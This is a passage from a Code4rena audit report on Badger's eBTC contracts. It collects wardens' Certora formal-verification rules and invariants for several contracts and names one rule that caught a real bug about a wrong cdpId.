**[Transfering system's collShares must decrease its shares](https://github.com/code-423n4/2023-10-badger/blob/main/certora-rechlis/specs/ActivePool.spec#L15)**

*Author: [capriza](https://github.com/code-423n4/2023-10-badger/blob/main/certora-rechlis/specs/ActivePool.spec#L15)*

```
rule mutActivePool(address account,uint256 shares){
    env e;

    uint256 systemCollShares_before = getSystemCollShares();
    
    transferSystemCollShares(e, account, shares);

    assert shares > 0 => getSystemCollShares() < systemCollShares_before;
}
```

**[The contract's share of `collateralToken` must be greater than or equal to the recorded share amount](https://github.com/code-423n4/2023-10-badger/blob/main/certora-rechlis/specs/ActivePool.spec#L51)**

*Author: [capriza](https://github.com/code-423n4/2023-10-badger/blob/main/certora-rechlis/specs/ActivePool.spec#L51)*

```
invariant require_2(env e)
    collateralToken.sharesOf(e,currentContract) >= getSystemCollShares()
filtered { f -> !f.isView && !f.isFallback &&
           f.selector != sig:transferSystemCollSharesAndLiquidatorReward(address,uint256,uint256).selector &&
           f.selector != sig:claimFeeRecipientCollShares(uint256).selector &&
           f.selector != sig:increaseSystemCollShares(uint256).selector}
```

**[Only BorrowerOperations should increase systemCollShares](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/ActivePool.spec#L94)**

*Author: [alexzoid](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/ActivePool.spec#L94)*

```
invariant onlyBorrowerOperationsIncreaseSystemCollShares(env e) 
    // Shares increased
    ghostSystemCollShares > ghostSystemCollSharesPrev   
        // Caller is BorrowerOperations
        => callerIsBO(e.msg.sender) {
    preserved with (env eFunc) {
        require(ghostSystemCollShares == ghostSystemCollSharesPrev);
        // Require `invariantEnv.msg.sender` == `e.msg.sender`
        require(e.msg.sender == eFunc.msg.sender);
    }
}
```

**[Only CdpManager, BorrowerOperations or authorized user should modify state](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/ActivePool.spec#L133)**

*Author: [alexzoid](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/ActivePool.spec#L133)*

```
rule modifyStateCallerRestrictions(env e, method f, calldataarg args) {
    
    storage before = lastStorage;

    f(e, args);

    storage after = lastStorage;

    // State was changed
    assert(before[currentContract] != after[currentContract] 
        => (e.msg.sender == cdpManagerAddress() 
        || e.msg.sender == borrowerOperationsAddress()
        || ghostCanCall[e.msg.sender][to_bytes4(f.selector)]
        )
    );
}
```

**[The collateral balance in the active pool must be greater than or equal to its accounting number](https://github.com/code-423n4/2023-10-badger/blob/main/certora-0x00ffDa/specs/ActivePool.spec#L52)**

*Author: [0x00ffDa](https://github.com/code-423n4/2023-10-badger/blob/main/certora-0x00ffDa/specs/ActivePool.spec#L52)*

```
invariant systemCollateralBalanceAccountingOk()
    to_mathint(collToken.sharesOf(currentContract)) >= to_mathint(getSystemCollShares() + getFeeRecipientClaimableCollShares())
    { 
        preserved transferSystemCollSharesAndLiquidatorReward(address _account, uint256 _shares, uint256 _liquidatorRewardShares) with (env e) {
            // Invariant fails if this function transfers rewards greater than the excess avail.
            // Only called when closing a CDP and there *should* be sufficient rewards for the last CDP (if other invariants hold).
            require to_mathint(collToken.sharesOf(currentContract)) >= to_mathint(_liquidatorRewardShares + getSystemCollShares() + getFeeRecipientClaimableCollShares());
        }
        preserved claimFeeRecipientCollShares(uint256 _shares) with (env e) {
            // Invariant fails if ActivePool's stETH balance does not have _shares in excess when havac'd feeRecipientCollShares implies
            // that it does. But excess does exist since the function requires it.
            require to_mathint(collToken.sharesOf(currentContract) - _shares) >= to_mathint(getSystemCollShares());
        }
        preserved increaseSystemCollShares(uint256 _shares) with (env e) {
            // Invariant fails when increasing internal accounting if actual stETH balance doesn't reflect it (or have sufficient excess). 
            require to_mathint(collToken.sharesOf(currentContract)) >= to_mathint(_shares + getSystemCollShares() + getFeeRecipientClaimableCollShares());
        }
    }
```

### CollSurplusPool

**[The collateral balance in the collSurplus pool is greater than or equal to its accounting number](https://github.com/code-423n4/2023-10-badger/blob/main/certora-0x00ffDa/specs/CollSurplusPool.spec#L28)**

*Author: [0x00ffDa](https://github.com/code-423n4/2023-10-badger/blob/main/certora-0x00ffDa/specs/CollSurplusPool.spec#L28)*

```
invariant collateralSurplusBalanceAccountingOk()
    collateral.sharesOf(currentContract) >= getTotalSurplusCollShares()
    { 
        preserved increaseTotalSurplusCollShares(uint256 _shares) with (env e) {
            // Invariant fails when increasing internal accounting if actual stETH balance doesn't reflect it (or have sufficient excess). 
            require to_mathint(collateral.sharesOf(currentContract)) >= to_mathint(_shares + getTotalSurplusCollShares());
        }
    }
```

**[The sum of all surpluses is equal to the value of getTotalSurplusCollShares](https://github.com/code-423n4/2023-10-badger/blob/main/certora-0x00ffDa/specs/CollSurplusPool.spec#L48)**

*Author: [0x00ffDa](https://github.com/code-423n4/2023-10-badger/blob/main/certora-0x00ffDa/specs/CollSurplusPool.spec#L48)*

```
invariant collateralSurplusSumsAllBalances()
    to_mathint(getTotalSurplusCollShares()) == sumOfSurplusColl
    filtered {
        // These functions modify only one part of the internal accounting. This invariant can't reason about them(?)
        f -> f.selector != sig:increaseTotalSurplusCollShares(uint256).selector
          && f.selector != sig:increaseSurplusCollShares(address,uint256).selector
    }
```

**[User shares could decrease only to zero and decrease total shares simultaneously](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/CollSurplusPool.spec#L50)**

*Author: [alexzoid](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/CollSurplusPool.spec#L50)*

```
invariant decreaseUserSharesTotalSharesSolvency(address user) 
    // If user balance changed in lower way
    ghostBalancesChanged[user] && ghostBalances[user] < ghostBalancesPrev[user]
        => (
            // It should be set to zero
            ghostBalances[user] == 0 
            // Total shares decrease to previous user balance
            && ghostTotalSurplusCollSharesPrev - ghostTotalSurplusCollShares == ghostBalancesPrev[user]
        ) {
        preserved {
            require(ghostBalancesChanged[user] == false);
        }
    }
```

**[Total shares could decrease only when user shares decrease, could not touch more that one user at time](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/CollSurplusPool.spec#L65)**

*Author: [alexzoid](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/CollSurplusPool.spec#L65)*

```
invariant decreaseTotalSharesUserSharesSolvency() 
    // If total shares changed in lower way
    ghostTotalSurplusCollSharesChanged && ghostTotalSurplusCollSharesPrev > ghostTotalSurplusCollShares
        // User balance should change too
        => ghostUserAddressBalancesChanged != 0 && (forall address i. ghostBalancesChanged[i] => (
            // Only one user balance should change at time
            i == ghostUserAddressBalancesChanged 
            // It should be set to zero
            && ghostBalances[i] == 0 
            // Total shares decrease to previous user balance 
            && ghostTotalSurplusCollSharesPrev - ghostTotalSurplusCollShares == ghostBalancesPrev[i]
        )) {
    preserved {
        require(ghostTotalSurplusCollSharesChanged == false);
        require(ghostUserAddressBalancesChanged == 0);
        require(forall address i. ghostBalancesChanged[i] == false);
    }
}
```

**[Monotonicity of collateral balance is preserved unless `claimSurplusCollShares` is called](https://github.com/code-423n4/2023-10-badger/blob/main/certora-rechlis/specs/CollSurplusPool.spec#L33)**

*Author: [capriza](https://github.com/code-423n4/2023-10-badger/blob/main/certora-rechlis/specs/CollSurplusPool.spec#L33)*

```
rule collateralOnlyIncreases(env e, method f){
    
    uint256 balanceBefore = collateral.balanceOf(currentContract);
    calldataarg args;
    f(e,args);
    uint256 balanceAfter = collateral.balanceOf(currentContract);
   
   assert !(balanceAfter >= balanceBefore) => f.selector == sig:claimSurplusCollShares(address).selector;
}
```

### EBTCToken

**[Sum of `balances` must equal `totalSupply`](https://github.com/code-423n4/2023-10-badger/blob/main/certora-BenRai1/specs/EBTCToken.spec#L53)**

*Author: [BARW](https://github.com/code-423n4/2023-10-badger/blob/main/certora-BenRai1/specs/EBTCToken.spec#L53)*

```
invariant totalSupplyIsSumOfUserBalances()
    to_mathint(totalSupply()) == sum_of_balances; 
```

**[Address zero must have no balance](https://github.com/code-423n4/2023-10-badger/blob/main/certora-jraynaldi3/specs/EBTCToken.spec#105)**

*Author: [Junnon](https://github.com/code-423n4/2023-10-badger/blob/main/certora-jraynaldi3/specs/EBTCToken.spec#105)*

```
invariant addressZeroNoAllowanceBalanceOrSpender()
    balanceOf(0) == 0;
```

### SortedCdps

**[`head` must never have `prevId`](https://github.com/code-423n4/2023-10-badger/blob/main/certora-jraynaldi3/specs/SortedCdps.spec#L299)**

*Author: [Junnon](https://github.com/code-423n4/2023-10-badger/blob/main/certora-jraynaldi3/specs/SortedCdps.spec#L299)*

```
invariant head_integrity(bytes32 id)
    first == id || !contains(id) <=> prev[id] == nonExistId()
    filtered {
        f -> f.selector != sig:batchRemove(bytes32[]).selector && !f.isView && !isHarnessCall(f)
    }{
        preserved with (env e) {
            bytes32 other;
            setupId(id, other);
        }
    }
```

**[If next of `id` is `other` then `prev` of `other` is id](https://github.com/code-423n4/2023-10-badger/blob/main/certora-jraynaldi3/specs/SortedCdps.spec#L333)**

*Author: [Junnon](https://github.com/code-423n4/2023-10-badger/blob/main/certora-jraynaldi3/specs/SortedCdps.spec#L333)*

```
invariant next_prev_correlation(bytes32 id, bytes32 other)
    id != nonExistId() && other != nonExistId() => (next[id] == other <=> prev[other] == id)
    filtered {
        f -> f.selector != sig:batchRemove(bytes32[]).selector && !f.isView && !isHarnessCall(f)
    }
    {
        preserved with (env e) {
            setupId(id, other);
        }
    }
```

**[If `size` is 0, `head` and `tail` must be 0](https://github.com/code-423n4/2023-10-badger/blob/main/certora-BenRai1/specs/SortedCdps.spec#L257)**

*Author: [BARW](https://github.com/code-423n4/2023-10-badger/blob/main/certora-BenRai1/specs/SortedCdps.spec#L257)*

```
invariant size0HeadTail0()
    ghostSize == 0 => ghostHead == zero && ghostTail == zero 
    filtered {
        f -> f.selector != sig:batchRemove(bytes32[]).selector
    }
```

**[When there is only 1 item in the list, properties of such a state must hold](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/base/sortedCdps.spec#L280)**

*Author: [alexzoid](https://github.com/code-423n4/2023-10-badger/blob/main/certora-alexzoid-eth/specs/base/sortedCdps.spec#L280)*

```
invariant sortedCdpsListOneItemSolvency() 
    // 1 item in the list
    (
        ghostHead != DUMMY_ID() && ghostNextId[ghostHead] == DUMMY_ID()
        || ghostTail != DUMMY_ID() && ghostPrevId[ghostTail] == DUMMY_ID()
        || ghostHead != DUMMY_ID() && ghostHead == ghostTail
        || ghostSize == 1
    ) => (
        ghostHead != DUMMY_ID() 
        && ghostHead == ghostTail
        && ghostSize == 1 
        // Zero NICR should not be inserted
        && ghostCachedNominalICR[ghostHead] != 0
        // Only non existent CDPs should be inserted
        && ghostCdpStatus[ghostHead] == CDP_STATUS_NON_EXISTENT()
        // No prev or next set
        && (forall bytes32 i. ghostPrevId[i] == DUMMY_ID() && ghostNextId[i] == DUMMY_ID())
    )
    filtered { f -> !HARNESS_REPLACED_OR_VIEW_FUNCTIONS(f) } { 
        preserved { 
            // Initially require valid list structure
            requireInvariant isListStructureValidInv;
            requireInvariant sortedCdpsListEmptySolvency;
            requireInvariant sortedCdpsListSeveralItemsSolvency;
            requireInvariant sortedCdpsListZeroIdsNotSupported;
        } 
}
```

## Vulnerabilities

Warden team BARW wrote the only rule that uncovered a "real bug". The vulnerability was a duplicate of this finding from the audit:

- [[M-05] When calling LeverageMacroBase.doOperation to open a CDP, the POST CALL CHECK may use the wrong cdpId](https://github.com/code-423n4/2023-10-badger-findings/issues/152)

### Certora Prover Property

*Author: [BARW](https://github.com/code-423n4/2023-10-badger/blob/main/certora-BenRai1/specs/SortedCdps.spec#L231)*

```
 rule ISSUEcdpOfOwnerByIndexWorks(){ 
        env e; 
        address owner; 
        uint256	index; 
        bytes32 startNodeId; 
        uint maxNodes; 
        bool boolResult; 
        bool boolTarget;  
        bytes32 bytes32Result; 
        bytes32 bytes32Target; 
        uint _currentIndex; 
  
        bytes32Result = cdpOfOwnerByIndex(e, owner, index); 
        bytes32Target, boolTarget, _currentIndex = cdpOfOwnerByIndexHarness(e, owner, index, dummyId(e), 0); 
        address ownerOfReturnedId = getOwnerAddress(e, bytes32Result); 
  
        assert(bytes32Result == bytes32Target, "Returned bytes32 is wrong"); 
        assert(ownerOfReturnedId == owner, "The owner of the returned cdp is not the target Owner"); 
        assert(_currentIndex == index, "The index of the returned cdpId is wrong"); 
  
 } 
```


***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
